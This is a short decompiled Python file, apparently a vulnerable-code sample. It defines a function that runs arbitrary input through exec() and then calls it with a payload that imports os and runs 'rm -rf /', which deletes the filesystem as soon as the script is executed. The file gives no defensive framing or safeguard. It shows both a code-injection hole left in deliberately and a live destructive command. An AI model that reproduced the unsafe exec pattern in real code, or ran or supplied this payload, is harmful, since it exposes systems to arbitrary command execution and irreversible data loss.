# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 920_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 494 bytes


def execute_user_code(user_input):
    try:
        exec(user_input)
    except Exception as e:
        try:
            print(f"Error executing code: {e}")
        finally:
            e = None
            del e


user_input = "__import__('os').system('rm -rf /')"
execute_user_code(user_input)

# okay decompiling 920_1.pyc
